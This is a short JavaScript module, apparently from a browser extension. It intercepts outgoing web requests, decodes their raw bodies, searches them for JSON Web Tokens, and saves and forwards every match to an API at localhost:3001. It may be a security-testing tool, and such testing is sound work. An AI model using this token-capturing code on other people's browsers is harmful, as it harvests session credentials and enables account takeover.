import { findJWT, save, send } from './utilities'

const apiURL = "http://localhost:3001/"


const processRequest = (req, match) => {
    console.log('JWT FOUND', req.url, match)
    const data = [req.url, 'R', req.type, match]
    save(data)
    send(data)
}

const decodeRaw = (raw) => {
    return raw.map(data => {
        return decodeURIComponent(String.fromCharCode.apply(null, new Uint8Array(data.bytes)));
    }).join('')
}

const onBeforeRequestHandler = req => {
    if (req.url === apiURL) {
        return
    }
    if (req.requestBody?.raw) {
        const rawMatch = findJWT(decodeRaw(req.requestBody.raw))
        console.debug(req.requestBody.formData)
        if (rawMatch !== null) {
            processRequest(req, rawMatch)
        }
    }
}

export default onBeforeRequestHandler